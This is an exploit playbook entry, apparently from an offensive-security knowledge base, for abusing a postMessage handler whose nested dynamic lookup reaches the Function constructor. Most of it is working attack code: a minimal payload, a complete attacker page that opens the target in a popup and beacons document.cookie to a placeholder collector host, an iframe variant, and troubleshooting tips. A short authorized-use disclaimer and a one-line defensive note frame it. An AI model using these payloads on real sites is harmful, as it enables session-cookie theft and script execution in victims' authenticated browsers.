# postMessage Nested Constructor Array Gadget Payload

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when:

- a widget handles `postMessage` with nested dispatch such as `log[event.data.cat][event.data.message_type](event.data)()`
- the handler gates on something like `event.data.action === 'log'`
- there is no strict `event.origin` allowlist
- a review/admin bot opens attacker-controlled partner URLs in an authenticated session

## Minimal Payload

Use an array so the code string survives structured clone and becomes the `Function` body:

```javascript
const code = '(new Image).src="https://[collector]/?c="+encodeURIComponent(document.cookie)';
const p = [code];
p.action = 'log';
p.cat = 'constructor';
p.message_type = 'constructor';

popup.postMessage(p, '*');
```

## Popup Partner Page Example

Prefer a popup over an iframe when the secret lives in first-party cookies:

```html
<!doctype html>
<meta charset=utf-8>
<body>
<script>
const TARGET = 'https://[provider]/embed/handoff';
const COLLECTOR = 'https://[collector]';
const w = window.open(TARGET, 'pw');

setTimeout(() => {
  const code = '(new Image).src="' + COLLECTOR + '/?c="+encodeURIComponent(document.cookie)';
  const p = [code];
  p.action = 'log';
  p.cat = 'constructor';
  p.message_type = 'constructor';
  w.postMessage(p, '*');
}, 2000);
</script>
```

## Iframe Variant

Use only for behavior confirmation. Cookie theft may fail because of third-party cookie restrictions:

```html
<script>
const frame = document.createElement('iframe');
frame.src = 'https://[provider]/embed/handoff';
document.body.appendChild(frame);

setTimeout(() => {
  const p = ['document.title="pwned"'];
  p.action = 'log';
  p.cat = 'constructor';
  p.message_type = 'constructor';
  frame.contentWindow.postMessage(p, '*');
}, 1500);
</script>
```

## Benign-Path Decoy

The normal route only logs attacker-controlled text:

```javascript
popup.postMessage({
  action: 'log',
  cat: 'error',
  message_type: 'general',
  pageName: 'test'
}, '*');
```

Do not stop here unless you have confirmed there is no nested-dispatch gadget.

## Why It Works

The receiver does:

```javascript
log[event.data.cat][event.data.message_type](event.data)()
```

With `cat=constructor` and `message_type=constructor`, that becomes `Function(event.data)()`. When `event.data` is an array, the array stringifies to attacker JavaScript and executes on invocation.

## Why It Fails

- routing keys are allowlisted to known categories such as `error.general`
- strict `event.origin` validation
- iframe-only delivery when the secret is in first-party cookies blocked in embedded context
- plain-object payloads without an array code element
- payloads that rely on custom `toString`

## Common Mistakes

- Focusing on `pageName` injection into `console.log`
- Testing only top-level `window[func]` gadgets and missing nested `obj[a][b]()` dispatch
- Putting the exploit script in `<head>` before `<body>` exists in popup-based flows
- Using `fetch` for exfil without verifying the callback path

## Defensive Note

Never route `postMessage` input through nested dynamic lookups. If logging bridges are required in non-production builds, gate them behind origin checks and fixed key names.
